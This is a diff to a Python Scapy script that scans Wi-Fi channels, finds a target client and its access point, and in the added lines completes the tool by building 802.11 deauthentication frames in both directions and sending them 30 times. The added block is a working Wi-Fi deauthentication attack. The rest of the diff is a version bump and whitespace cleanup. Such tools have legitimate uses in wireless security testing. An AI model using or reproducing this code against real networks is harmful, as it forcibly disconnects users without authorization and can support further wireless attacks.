@@ -3,7 +3,7 @@
 __author__ = "Rodney Beede"
 __copyright__ = "Copyright 2020, Rodney Beede"
 __license__ = "AGPL Version 3"
-__version__ = "1.2020.06.03"
+__version__ = "1.2020.06.12"
 
 
 import argparse
@@ -40,7 +40,7 @@ wireless_access_points = dict()
 # keys
 # CLIENT MAC
 # AP MAC
-# CHANNEL
+# CHANNEL - this may not be the center channel of the AP but should be within the range
 # FREQUENCY
 matching_client = dict()
 
@@ -56,7 +56,7 @@ def main(interface):
 	print("Waiting to detect a matching client and collecting access points")
 	while not matching_client:
 		print(".", end="")
-		
+
 		time.sleep(1)
 
 	print("FOUND MATCHING CLIENT: ", end="")
@@ -65,14 +65,34 @@ def main(interface):
 	print("Waiting to detect matching AP beacon")
 	while not matching_client["AP MAC"] in wireless_access_points:
 		print(".", end="")
-		
+
 		time.sleep(1)
-	
+
 	print("FOUND MATCHING AP: ", end="")
 	pprint.PrettyPrinter().pprint(wireless_access_points[matching_client["AP MAC"]])
+	
+	worker_rotate_channel.terminate()
+	worker_sniff_wireless.terminate()
 
 
-	# TODO send the deauth
+	# Deauth the device
+	deauth_pkt_for_ap = (RadioTap()/
+		Dot11(addr1=matching_client["CLIENT MAC"], addr2=matching_client["AP MAC"], addr3=matching_client["AP MAC"])/
+		Dot11Deauth())
+		
+	deauth_pkt_for_client = (RadioTap()/
+		Dot11(addr1=matching_client["AP MAC"], addr2=matching_client["CLIENT MAC"], addr3=matching_client["CLIENT MAC"])/
+		Dot11Deauth())
+
+	for i in range(30):
+		print(f"Send deauth #{i}...")
+		sendp(deauth_pkt_for_ap, iface=interface)
+		sendp(deauth_pkt_for_client, iface=interface)
+
+		time.sleep(1)
+
+
+
 
 	print("ENDING THE PROGRAM")
 
@@ -94,6 +114,7 @@ def packet_handler(pkt):
 		receiving_mac = pkt[Dot11].addr1
 
 		frequency = pkt[RadioTap].ChannelFrequency
+		
 		if 5 == operator.floordiv(frequency, 1000):
 			channel = operator.floordiv(frequency - 5000, 5)
 		else:
@@ -116,18 +137,16 @@ def rotate_wifi_channel(interface):
 	curr_channel = 1
 	while not matching_client:
 		os.system(f"iwconfig {interface} channel {curr_channel}")
-		
-		#DEBUG, to remove
+
 		curr_channel = curr_channel % 14 + 1
-		#curr_channel = 11
-		
+
 		time.sleep(2)
-	
+
 	# Lock onto the desired channel in-case we are still scanning
 	curr_channel = matching_client["CHANNEL"]
 	os.system(f"iwconfig {interface} channel {curr_channel}")
 	print(f"No longer rotating channel, locked onto {curr_channel}")
-	
+
 
 
 
